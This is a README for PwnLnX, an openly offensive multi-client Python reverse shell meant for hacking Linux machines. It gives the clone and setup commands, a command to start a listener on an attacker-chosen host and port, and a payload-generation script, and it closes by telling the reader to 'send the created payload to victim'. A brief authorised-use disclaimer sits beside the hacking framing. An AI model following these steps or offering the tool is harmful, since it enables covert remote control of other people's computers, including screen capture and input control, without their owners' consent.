# PwnLnX
An advanced **multi-threaded**, **multi-client** python reverse shell for hacking linux systems. There's still more work to do so feel free to help out with the development.
**Disclaimer**: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

## Getting Started
Please follow these instructions to get a copy of PwnLnX running on your local machine without any problems.
### Prerequisites
* Python3:
    * vidstream
    * pyfiglet
    * tqdm
    * mss
    * pyautogui
    * pyinstaller*
    * pip3

### Installing
```bash
# Download source code
git clone https://github.com/spectertraww/PwnLnX.git


cd PwnLnX

# download and  install the dipendences
chmod +x setup.sh

./setup.sh

```

### Getting PwnLnx up and running
#### Show help
`python3 PwnLnX.py --help`

#### Listening for incoming connections
`python3 PwnLnX.py --lhost [your localhost ip address] --lport [free port for listening incoming connections]`

#### creating a payload
```bash
chmod +x PwnGen.sh

./PwnGen.sh

```

>then follow the procedure to successifully create your payload, the payload is saved in PwnLnx directory. Send the created payload to victim





